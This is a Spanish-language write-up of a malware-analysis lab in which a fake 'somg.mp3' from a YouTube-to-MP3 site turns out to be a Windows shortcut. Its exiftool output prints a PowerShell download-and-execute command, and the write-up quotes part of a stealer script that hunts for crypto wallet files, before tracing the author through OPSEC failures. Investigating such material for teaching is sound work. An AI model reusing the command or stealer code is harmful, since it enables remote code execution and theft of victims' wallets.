# Introducción 

Los dedos de McSkidy revoloteaban sobre el teclado y entrecerraba los ojos al ver el sitio web sospechoso que aparecía en su pantalla. Había visto docenas de campañas de malware como esta. Esta vez, el rastro la llevaba directamente a alguien que respondía al nombre "Glitch".

"Demasiado fácil", murmuró con una sonrisa burlona.

"Todavía tengo tiempo", dijo, inclinándose más cerca de la pantalla. "Tal vez haya más".

Lo que no sabía es que debajo de la superficie se escondía algo mucho más complejo que el simple nombre de usuario de un hacker. Este era solo el comienzo de una red enredada que desenredaba todo lo que creía saber.

# Objetivos de aprendizaje

- Aprender como investigar archivos maliciosos
- Aprender sobre OPSEC y fallos de OPSEC
- Entender como traquear y atribuir digitalmente identidades

# Investigar la web

La web que investigamos convierte los videos de youtube en MP3 deberemos meternos mas dentro y explorarla

![image](https://github.com/user-attachments/assets/c81c5638-a5fa-42c9-9128-ae5e2810f58a)

Este tipo de webs llevan mucho tiempo, ofrece una fomra de convertir a extracto de audio los videos de youtube siendo websites muy populares

Problemas:

- Malversación: Muchos sitios contienen anuncion que explotan vulnerabilidades de usuario
- Phishing Scam
- Bundled Malware

Vamos a coger un link de youtube y vamos a descargarlo una veez lo investigaremos.

 https://www.youtube.com/watch?v=dQw4w9WgXcQ

 ![image](https://github.com/user-attachments/assets/22243695-5336-49be-95b6-030635cbe512)

Una vez descargado nos iremos a Downoads y lo extraeremos

![image](https://github.com/user-attachments/assets/a167bb74-4f23-418b-9b7c-08b555e4efd9)

Para determinar el contenido del archivo

```
file song.mp3
```

Como podemos ver es n archivo de audio, nada parece sospechoso. La cosa es que tenemos otro arhcivo parece ser "somg.mp3"

```
file somg.mp3
```
Como vemos en un "MS windows Shortcul" Este archivo se usa para linkearlo con otro archivo o  aplicacion. Pudiendo ejecutar comandos de Windows

Vamos a utilizar Exiftool a ver si encontramos algo chulo

```
exiftool somg.mp3
```

```
ExifTool Version Number         : 11.88
File Name                       : somg.mp3
Directory                       : .
File Size                       : 2.1 kB
File Modification Date/Time     : 2024:10:30 14:32:52+00:00
File Access Date/Time           : 2024:12:10 09:59:59+00:00
File Inode Change Date/Time     : 2024:12:10 09:58:24+00:00
File Permissions                : rw-r--r--
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata
File Attributes                 : Archive
Create Date                     : 2018:09:15 08:14:14+01:00
Access Date                     : 2018:09:15 08:14:14+01:00
Modify Date                     : 2018:09:15 08:14:14+01:00
Target File Size                : 448000
Icon Index                      : (none)
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Volume Label                    : 
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
```

Como podemos ver hay tenemos los comandos que quiere ejecutar con la power shell

- -ep Bypass -nop : Quita restricciones usuales
- DownloadFIle: Nos descarga un "IS.ps1" de un servidor remoto de una ruta remoto, una vez descargado lo mete y le cambia el nombre

Si visitamos el archivo en cuestión

```

function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

[Output truncated for brevity]
```

El script recolecta información sensible de la victima, como wallets o credenciales guardadas en el navegador

## Buscar el código fuente

Despueés de nuestra investigación, podemos investigar aún más la página analizar el código buscar directorios, etc.

Sin embargo, en esta room lo haremos diferentes. Porque tenemos el codigo dl powershell y lo podemos buscar online o uqe nos de tips para el ejercicio

https://github.com/search?q="Created+by+the+one+and+only+M.M."&type=issues

Vemos una conversación entre los desarrolladores

https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/1

## Introducción a OPSEC

Esto es un caso de fallo de OPSEC, es un termino reconocido para la protección de información sensible.

- Reusar usuarios, email
- Usar metadatos identificables
- Publicar algo en github
- Fallar al usar VPN etc

GG!!


